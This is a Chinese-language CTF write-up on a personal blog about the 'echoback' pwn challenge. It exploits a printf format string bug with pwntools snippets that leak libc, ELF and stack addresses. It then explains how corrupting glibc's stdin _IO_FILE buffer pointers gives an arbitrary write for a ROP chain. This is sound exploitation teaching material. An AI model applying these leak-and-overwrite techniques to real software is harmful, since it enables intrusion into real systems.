<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:type" content="website">
<meta property="og:title" content="I0gan">
<meta property="og:url" content="http://blog.i0gan.cn/page/6/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:locale">
<meta property="article:author" content="i0gan">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-wp-echoback" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/04/wp-echoback/" class="article-date">
  <time datetime="2020-04-04T05:00:44.000Z" itemprop="datePublished">2020-04-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/04/wp-echoback/">wp echoback</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="echoback"><a href="#echoback" class="headerlink" title="echoback"></a>echoback</h1><p>题目来源: World of Attack &amp; Defense</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_B80</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-14h] long int</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;length:&quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0L</span>L || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">6</span> )</span><br><span class="line">    LODWORD(nbytes) = <span class="number">7</span>; <span class="comment">//limits</span></span><br><span class="line">  read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s say:&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;anonymous say:&quot;</span>, (<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);            <span class="comment">// fmt vum</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显的字符串漏洞,但是最多只允许输入7个字符.</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链</p>
<h3 id="泄漏libc基址"><a href="#泄漏libc基址" class="headerlink" title="泄漏libc基址"></a>泄漏libc基址</h3><p>传入 %p调试到vfprintf函数堆栈如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe31470828 —▸ 0x7ffe3146e250 ◂— &#39;anonymous say:&#39;</span><br><span class="line">07:0038│      0x7ffe31470830 —▸ 0x7f81d9132780 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line">08:0040│      0x7ffe31470838 —▸ 0x7f81d8e632c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">09:0048│      0x7ffe31470840 —▸ 0x7f81d9339700 ◂— 0x7f81d9339700</span><br><span class="line">0a:0050│      0x7ffe31470848 ◂— 0xe</span><br><span class="line">0b:0058│      0x7ffe31470850 ◂— 0x6562b026</span><br><span class="line">0c:0060│      0x7ffe31470858 —▸ 0x7f81d91316a3 (_IO_2_1_stdout_+131) ◂— 0x132780000000000a </span><br><span class="line">...           ...</span><br><span class="line">28:0140│      0x7ffe31470938 ◂— 0x746df13682d53b00</span><br><span class="line">29:0148│      0x7ffe31470940 —▸ 0x562293252d30 ◂— push   r15</span><br><span class="line">2a:0150│      0x7ffe31470948 —▸ 0x7f81d8d8c830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">2b:0158│      0x7ffe31470950 —▸ 0x7ffe31470a28 —▸ 0x7ffe31470fb8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过调试, 传入 %p打印时, 打印出0x7ffe31470830, 而 __libc_start_main+240 的地址在0x7ffe31470948, 调试不断加1进行核对地址,最终在 %19$p打印出libc_start_main + 240的地址.然后通过计算即可获取libc基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leaking libc base</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%19$p&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	libc_start_main = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">	libc_base = libc_start_main - lib.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	sys_addr = libc_base + lib.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	sh_addr  = libc_base + lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>

<h3 id="泄漏elf基址"><a href="#泄漏elf基址" class="headerlink" title="泄漏elf基址"></a>泄漏elf基址</h3><p>传入 %14$p查看printf函数中堆栈分布如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">05:0028│ rdi  0x7ffc6b02ca80 ◂— 0xa7024343125 &#x2F;* &#39;%14$p\n&#39; *&#x2F;</span><br><span class="line">06:0030│      0x7ffc6b02ca88 ◂— 0xb8b63dff1d802400</span><br><span class="line">07:0038│ rbp  0x7ffc6b02ca90 —▸ 0x7ffc6b02cac0 —▸ 0x55f4515b5d30 ◂— push   r15</span><br><span class="line">08:0040│      0x7ffc6b02ca98 —▸ 0x55f4515b5d08 ◂— jmp    0x55f4515b5d0b</span><br><span class="line">09:0048│      0x7ffc6b02caa0 —▸ 0x55f4515b5d30 ◂— push   r15</span><br><span class="line">0a:0050│      0x7ffc6b02caa8 ◂— 0x200000000</span><br><span class="line">0b:0058│      0x7ffc6b02cab0 ◂— 0x0</span><br><span class="line">0c:0060│      0x7ffc6b02cab8 ◂— 0xb8b63dff1d802400</span><br></pre></td></tr></table></figure>

<p>打印出0x55f4515b5d30 ◂— push   r15, 而这个位置刚好在init函数的起始位置.在文件中偏移为: 0xD30 ( push    r15),这就可以计算elf的偏移了.然后获取main, pop rid的地址.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leaking elf base</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%14$p&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	elf_base = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xD30</span></span><br><span class="line">	main_addr = elf_base + <span class="number">0xC6C</span></span><br><span class="line">	pop_rdi_ret = elf_base + <span class="number">0xd93</span></span><br><span class="line">	li(<span class="string">&#x27;elf_base:&#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br></pre></td></tr></table></figure>



<h3 id="泄漏堆栈中main-ret地址"><a href="#泄漏堆栈中main-ret地址" class="headerlink" title="泄漏堆栈中main ret地址"></a>泄漏堆栈中main ret地址</h3><p>下图为printf函数中的堆栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 100</span><br><span class="line">00:0000│ rsp  0x7fffb8e184a8 —▸ 0x55ff36954c55 ◂— nop    </span><br><span class="line">01:0008│      0x7fffb8e184b0 —▸ 0x55ff36954ef8 ◂— xor    ebp, dword ptr [rsi] &#x2F;* &#39;3. exit&#39; *&#x2F;</span><br><span class="line">02:0010│      0x7fffb8e184b8 —▸ 0x7fffb8e18500 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffb8e184c0 ◂— 0xa32 &#x2F;* &#39;2\n&#39; *&#x2F;</span><br><span class="line">04:0020│      0x7fffb8e184c8 ◂— 0x7134b9900</span><br><span class="line">05:0028│ rdi  0x7fffb8e184d0 ◂— 0xa7024353125 &#x2F;* &#39;%15$p\n&#39; *&#x2F;</span><br><span class="line">06:0030│      0x7fffb8e184d8 ◂— 0xc7f0a378134b9900</span><br><span class="line">07:0038│ rbp  0x7fffb8e184e0 —▸ 0x7fffb8e18510 #泄漏该地址, 获取main ret</span><br><span class="line">08:0040│      0x7fffb8e184e8 —▸ 0x55ff36954d08 ◂— jmp    0x55ff36954d0b</span><br><span class="line">09:0048│      0x7fffb8e184f0 —▸ 0x55ff36954d30 ◂— push   r15</span><br><span class="line">0a:0050│      0x7fffb8e184f8 ◂— 0x200000000</span><br><span class="line">0b:0058│      0x7fffb8e18500 ◂— 0x0</span><br><span class="line">0c:0060│      0x7fffb8e18508 ◂— 0xc7f0a378134b9900</span><br><span class="line">0d:0068│      0x7fffb8e18510 —▸ 0x55ff36954d30 ◂— push   r15 # main rbp</span><br><span class="line">0e:0070│      0x7fffb8e18518 —▸ 0x7fa5b79af830 (__libc_start_main+240) #mian的返回地址</span><br></pre></td></tr></table></figure>

<p>以上0x7fffb8e18518就是我们要获取的main ret的堆栈地址, 在这里不能直接泄漏堆栈中的main ret地址,但可以通过泄漏 rbp地址来+8即可获取man ret.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leaking main ret in stack</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	p = <span class="string">&#x27;%12$p&#x27;</span></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	main_ret = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x8</span></span><br></pre></td></tr></table></figure>


<h3 id="修改-IO-FILE将数据打入stack"><a href="#修改-IO-FILE将数据打入stack" class="headerlink" title="修改_IO_FILE将数据打入stack"></a>修改_IO_FILE将数据打入stack</h3><p>目前,准备工作基本完毕, 现在就是要靠修改main ret地址来劫持程序流, 但是我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符，setName，它不是白放那里的，它有着重要的作用.</p>
<p>它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0</p>
<p>然后，发现，%16$p输出的就是a1的数据,于是，可以先setName(p64(addr))，然后利用%16$n来对addr处写数据然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7,于是，就需要用到一个新知识了，为了绕过7个字符的限制，利用printf漏洞先去攻击scanf内部结构，然后就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码.</p>
<h4 id="IO-FILE-struct"><a href="#IO-FILE-struct" class="headerlink" title="_IO_FILE struct"></a>_IO_FILE struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;    </span></span><br><span class="line"><span class="comment">_IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;    </span></span><br><span class="line"><span class="comment">_IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic </span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments. </span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> _fileno;  </span><br><span class="line">  <span class="keyword">int</span> _flags2;  </span><br><span class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;  </span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>

<h4 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h4><p>看看文件的读取过程<strong>_IO_new_file_underflow</strong> <strong>这个函数最终调用了_IO_SYSREAD**</strong>系统调用来读取文件。在这之前，它做了一些处理**</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_file_underflow (FILE *fp)  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="keyword">ssize_t</span> count;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span>  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)  </span><br><span class="line">    <span class="keyword">return</span> EOF;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)  </span><br><span class="line">    &#123;  </span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;  </span><br><span class="line">      __set_errno (EBADF);  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  <span class="comment">//判断是否已经读完</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span>  </span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);  </span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;  </span><br><span class="line">    &#125;  </span><br><span class="line">      _IO_doallocbuf (fp);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span>  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t </span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that </span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better </span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here </span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span>  </span><br><span class="line">      _IO_acquire_lock (_IO_stdout);  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))  </span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))  </span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);  </span><br><span class="line">  </span><br><span class="line">      _IO_release_lock (_IO_stdout);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  _IO_switch_to_get_mode (fp);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those </span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since </span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for </span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span>  </span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  </span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  <span class="comment">//重新设置新的 _IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end  </span><br><span class="line">    = fp-&gt;_IO_buf_base;  </span><br><span class="line">  <span class="comment">//--------------------------------------</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  <span class="comment">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span></span><br><span class="line">          fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//写入长度:fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)  </span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;  </span><br><span class="line">      <span class="keyword">else</span>  </span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">  fp-&gt;_IO_read_end += count; <span class="comment">//使 _IO_read_end指针向后移动 </span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active </span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so </span></span><br><span class="line"><span class="comment">     unset it.  */</span>  </span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)  </span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);  </span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>IO_SYSREAD系统调用，向fp-&gt;_IO_buf_base处写入读取的数据，并且长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</p>
<p>要是能够修改_IO_buf_base和_IO_buf_end 那么就可以实现任意位置和想要的长度</p>
<p>首先需要定位到_IO_2_1_stdin_结构体在内存中的位置，然后再定位到_IO_buf_base 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr = _IO_buf_base + 0x8 * 7 (注意结构体对齐,int占用内存8字节,所以为 0x8 * 7 而不是 0x8 * 6 + 4)</p>
